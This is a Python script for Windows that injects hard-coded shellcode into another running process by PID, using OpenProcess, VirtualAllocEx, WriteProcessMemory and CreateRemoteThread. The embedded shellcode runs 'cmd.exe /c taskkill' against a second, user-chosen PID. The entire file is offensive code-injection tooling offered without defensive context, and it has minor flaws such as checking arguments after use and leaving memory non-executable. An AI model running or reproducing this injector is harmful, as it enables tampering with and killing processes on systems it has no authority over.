import sys
from ctypes import *

PAGE_READWRITE = 0X04
PROCESS_ALL_ACCESS = (0X000F0000 | 0X00100000 | 0XFF)
VIRTUAL_MEM = (0X1000 | 0X2000)

kernel32 = windll.kernel32
pid = int(sys.argv[1])
pid_to_kill = sys.argv[2]

if not sys.argv[1] or not sys.argv[2] :
    print("Code Injector : ./code_injector.py <PID to inject> <PID to Kill>")
    sys.exit(0)

shellcode = \
"\xfc\xe8\x44\x00\x00\x00\x8b\x45\x3c\x8b\x7c\x05\x78\x01\xef\x8b" \
"\x4f\x18\x8b\x5f\x20\x01\xeb\x49\x8b\x34\x8b\x01\xee\x31\xc0\x99" \
"\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x3b\x54\x24\x04" \
"\x75\xe5\x8b\x5f\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb" \
"\x8b\x1c\x8b\x01\xeb\x89\x5c\x24\x04\xc3\x31\xc0\x64\x8b\x40\x30" \
"\x85\xc0\x78\x0c\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x68\x08\xeb\x09" \
"\x8b\x80\xb0\x00\x00\x00\x8b\x68\x3c\x5f\x31\xf6\x60\x56\x89\xf8" \
"\x83\xc0\x7b\x50\x68\xef\xce\xe0\x60\x68\x98\xfe\x8a\x0e\x57\xff" \
"\xe7\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20\x74\x61\x73\x6b" \
"\x6b\x69\x6c\x6c\x20\x2f\x50\x49\x44\x20\x41\x41\x41\x41\x00"

#kill process shellcode

padding = 4 - (len(pid_to_kill))
replace_value = pid_to_kill
replace_string = "\x41" * 4#change shellcode pid name

shellcode = shellcode.replace(replace_string,replace_value)
code_size = len(shellcode)

h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS,False,int(pid))

if not h_process :
    print("[*] Couldn't acquire a handle to PID : %s"% pid)
    sys.exit(0)

arg_address = kernel32.VirtualAllocEx(h_process,0,code_size,VIRTUAL_MEM,PAGE_READWRITE)#alloc mem space to remote process

written = c_int(0)
kernel32.WriteProcessMemory(h_process,arg_address,shellcode,code_size,byref(written))#write shell code

thread_id = c_ulong(0)

if not kernel32.CreateRemoteThread(h_process,None,0,arg_address,None,0,byref(thread_id)) :#create remote thread
    print("[*] Failed to inject the DLL. Exiting.")
    sys.exit(0)

print("[*] Remote thread with ID 0x%08x created."%thread_id.value)


